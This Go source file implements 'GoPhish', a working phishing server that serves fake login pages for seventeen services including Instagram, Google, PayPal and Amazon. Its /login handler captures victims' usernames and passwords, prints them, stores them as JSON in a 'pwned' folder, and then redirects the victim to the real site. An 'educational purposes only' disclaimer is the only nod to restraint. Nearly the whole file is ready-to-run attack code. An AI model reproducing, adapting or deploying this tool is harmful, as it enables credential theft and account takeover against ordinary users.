/*
A login phishing tool created by @DeadVCR.
http://deadvcr.com/
Simply compile and run. No dependencies needed!
Credits (Copyright)
Pages generated by An0nUD4Y (https://github.com/An0nUD4Y):
Instagram
Phishing Pages generated by Social Fish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish):
Facebook,Google,Twitter
Phishing Pages generated by @suljot_gjoka (https://github.com/whiteeagle0/blackeye):
PayPal,eBay,CryptoCurrency,Adobe ID,Messenger,Twitch,Myspace,devianART
if I missed some let me know lol
**Reminder that DropBox is a steaming pile of shit and you should never ever use it :)**
*/

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {
	menu()
}

type Login struct {
	Username string
	Password string
}

type ChoiceHandler struct {
	Choice string
	Redir  string
}

type Defaults struct {
	Redirect string
	BindIP   string
	BindPort string
}

func menu() {
	fmt.Println("")
	fmt.Println("")
	fmt.Println("Created by @DeadVCR")
	fmt.Println("http://deadvcr.com/")
	fmt.Println("")
	fmt.Println("GoPhish - Login Phishing Tool")
	fmt.Println("!!WARNING!! - Developers assume no liability and are not responsible to damage")
	fmt.Println("caused by this program. Please use ONLY for educational purposes. Thank you!")
	fmt.Println("--> ATTACKING TARGETS WITHOUT CONSENT IS ILLEGAL! <--")
	fmt.Println("")
	fmt.Println("Now... Pick your poison :)")
	fmt.Println("")
	fmt.Println("[01] Instagram")
	fmt.Println("[02] Facebook")
	fmt.Println("[03] Twitter")
	fmt.Println("[04] Google")
	fmt.Println("[05] PayPal")
	fmt.Println("[06] Steam")
	fmt.Println("[07] Linkedin")
	fmt.Println("[08] eBay")
	fmt.Println("[09] CryptoCurrency")
	fmt.Println("[10] Adobe ID")
	fmt.Println("[11] Messenger")
	fmt.Println("[12] Twitch")
	fmt.Println("[13] Badoo")
	fmt.Println("[14] devianART")
	fmt.Println("[15] Snapchat")
	fmt.Println("[16] Netflix")
	fmt.Println("[17] Amazon")
	fmt.Println("")
	fmt.Println("")

	loaddefaults, err := ioutil.ReadFile("defaults.json")
	var defaults Defaults
	if err != nil {
		log.Fatal(err)
	}
	json.Unmarshal([]byte(loaddefaults), &defaults)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[*] Choose an option: ")
	choice, _ := reader.ReadString('\n')
	fmt.Print("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
	redir, _ := reader.ReadString('\n')
	fmt.Print("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
	listenip, _ := reader.ReadString('\n')
	fmt.Print("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
	listenport, _ := reader.ReadString('\n')

	if len(listenip) <= 2 {
		listenip = defaults.BindIP
	}
	listenip = strings.TrimSpace(listenip)
	redir = strings.TrimSpace(redir)
	listenport = strings.TrimSpace(listenport)
	if redir == "" {
		redir = defaults.Redirect
	}
	if len(listenport) == 0 {
		listenport = defaults.BindPort
	}
	bloatedChoiceHandler(choice)
	loadTheWebMan(choice, listenip, listenport, redir)

}

func bloatedChoiceHandler(choice string) string {
	choice = strings.TrimSpace(choice)
	returns := "default"
	switch choice {
	case "1":
		returns = "instagram"
	case "2":
		returns = "facebook"
	case "3":
		returns = "twitter"
	case "4":
		returns = "google"
	case "5":
		returns = "paypal"
	case "6":
		returns = "steam"
	case "7":
		returns = "linkedin"
	case "8":
		returns = "ebay"
	case "9":
		returns = "cryptocurrency"
	case "10":
		returns = "adobe"
	case "11":
		returns = "messenger"
	case "12":
		returns = "twitch"
	case "13":
		returns = "badoo"
	case "14":
		returns = "devianart"
	case "15":
		returns = "snapchat"
	case "16":
		returns = "netflix"
	case "17":
		returns = "amazon"
	}
	if returns == "default" {
		log.Fatal("Please enter a valid option. (Example: '1' for Instagram)")
	}
	return returns
}

func loadTheWebMan(choice, listenip, listenport, redir string) {
	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
	fmt.Println("[*] HTTP listener started on " + listenip + ":" + listenport)
	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
}

func (p *Login) lmaoOwnedInfo(choice string) error {
	filename := p.Username + ".json"
	var login Login
	json.Unmarshal([]byte(filename), &login)
	m := Login{p.Username, p.Password}
	b, err := json.Marshal(m)
	if err != nil {
		log.Fatal(err)
	}

	path := "pwned/" + choice

	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0600)
	}
	fmt.Println("[!] Login retrieved!")
	fmt.Println("[!] Username: " + p.Username)
	fmt.Println("[!] Password: " + p.Password)
	fmt.Println("[*] Saved to " + path + "/" + filename)

	return ioutil.WriteFile(path+"/"+filename, b, 0600)
}

func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
	theChoice := bloatedChoiceHandler(ch.Choice)
	p := &Login{}
	t, _ := template.ParseFiles("templates/" + theChoice + "/login.html")
	t.Execute(w, p)
}

func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	username := r.FormValue("username")
	password := r.FormValue("password")
	p := &Login{Username: username, Password: password}
	if p.Username == "" || p.Password == "" {
		http.Error(w, "Please enter a valid username or password!", 500)
		return
	}
	theChoice := bloatedChoiceHandler(ch.Choice)
	p.lmaoOwnedInfo(theChoice)
	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
}
